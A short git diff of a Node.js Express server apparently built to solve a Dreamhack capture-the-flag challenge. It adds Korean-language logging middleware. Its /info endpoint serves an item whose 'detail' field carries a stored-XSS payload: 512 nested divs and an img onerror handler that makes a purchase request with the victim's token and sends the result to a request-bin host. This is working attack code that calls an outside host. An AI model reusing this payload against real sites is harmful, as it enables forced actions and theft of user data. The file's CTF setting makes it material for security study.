@@ -10,6 +10,24 @@ const rqb = "https://dbfsydv.request.dreamhack.games";
 
 app.use(express.json());
 
+app.use((req, res, next) => {
+    console.log(`${req.method} 요청을 받았습니다. 경로: ${req.originalUrl}`);
+    
+    const originalSend = res.send;
+    res.send = function (body) {
+        console.log('응답 내용:', body);
+        return originalSend.call(this, body);
+    };
+
+    const originalStatus = res.status;
+    res.status = function (code) {
+        console.log('응답 상태 코드:', code);
+        return originalStatus.call(this, code);
+    };
+
+    next();
+});
+
 app.get('/info', (req, res) => {
     const token = req.headers['token'];
 
@@ -19,7 +37,7 @@ app.get('/info', (req, res) => {
         "price": 9,
         "detail": `${`<div>`.repeat(512)}${`</div>`.repeat(512)}<img src='' onerror='fetch("${url}/4/buy", {method: "POST",headers: {"Content-Type": "application/json","token": "${token}"}}).then(response => response.json()).then(data => {fetch("${rqb}/"+data.data)})'/>`,
         "poster": ""
-    }
+    };
 
     if (items) {
         res.send(items);
